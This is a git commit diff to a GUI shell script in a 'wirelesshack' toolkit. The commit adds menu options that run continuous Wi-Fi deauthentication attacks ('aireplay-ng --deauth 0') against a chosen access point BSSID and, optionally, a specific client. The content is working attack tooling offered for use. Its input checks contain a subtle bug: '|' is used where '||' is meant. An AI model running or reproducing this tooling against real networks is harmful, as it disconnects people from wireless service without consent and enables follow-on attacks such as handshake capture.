ff898aa91b149c4488e2308111c8d9aaa7c5a710
mikhailsimon <mikhailsimon0705@gmail.com>
2023-04-15 23:03:06 +0800

    fixed double interface prompt

--- commands/wirelesshack/deauth/deauth.sh
+++ commands/wirelesshack/deauth/deauth.sh
@@ -1,13 +1,12 @@
-prompt1=$(zenity --list --title="Wireless Hacking" --column="Deauth Attack" "Injection Test" "Deauth(ESSID)" "Deauth(ESSID+Client)" --width=300 --height=300)
+prompt1=$(zenity --list --title="Wireless Hacking" --column="Deauth Attack" "Injection Test" "Deauth(ESSID)" "Deauth(ESSID+Client)" "Deauth(BSSID)" "Deauth(BSSID+Client)" --width=300 --height=300)
 
 check_adapter() {
 iwconfig | zenity --text-info --title="Available Adapter List" --width=500 --height=300
 }
 
 channel_sel() {
-wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
 channel=$(zenity --entry --title="Channel" --text="Channel:" --width=300)
- if [ -z "$channel" ] | [ -z "$wlan" ]
+ if [ -z "$channel" ]
    then
      zenity --info --title="Error" --text="Please insert input"
      exit 1
@@ -56,3 +55,31 @@ then
  zenity --info --title="Deauth" --text="Deauthing..." | gnome-terminal -- sudo aireplay-ng --deauth 0 -e "$essid" -c "$cbssid" "$wlan"
 fi
 
+if [ "$prompt1" == "Deauth(BSSID)" ]
+then
+ check_adapter
+ wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
+ bssid=$(zenity --entry --title="BSSID" --text="BSSID:" --width=300)
+  if [ -z "$wlan" ] | [ -z "$bssid" ]
+   then
+     zenity --info --title="Error" --text="Please insert input"
+     exit 1
+  fi
+ channel=$(channel_sel)
+ zenity --info --title="Deauth" --text="Deauthing..." | gnome-terminal -- sudo aireplay-ng --deauth 0 -a "$bssid" "$wlan"
+fi
+
+if [ "$prompt1" == "Deauth(BSSID+Client)" ]
+then
+ check_adapter
+ wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
+ bssid=$(zenity --entry --title="BSSID" --text="BSSID:" --width=300)
+ cbssid=$(zenity --entry --title="Client BSSID" --text="Client BSSID:" --width=300)
+  if [ -z "$wlan" ] | [ -z "$bssid" ] | [ -z "$cbssid" ]
+   then
+     zenity --info --title="Error" --text="Please insert input"
+     exit 1
+  fi
+ channel=$(channel_sel)
+ zenity --info --title="Deauth" --text="Deauthing..." | gnome-terminal -- sudo aireplay-ng --deauth 0 -a "$bssid" -c "$cbssid" "$wlan"
+fi
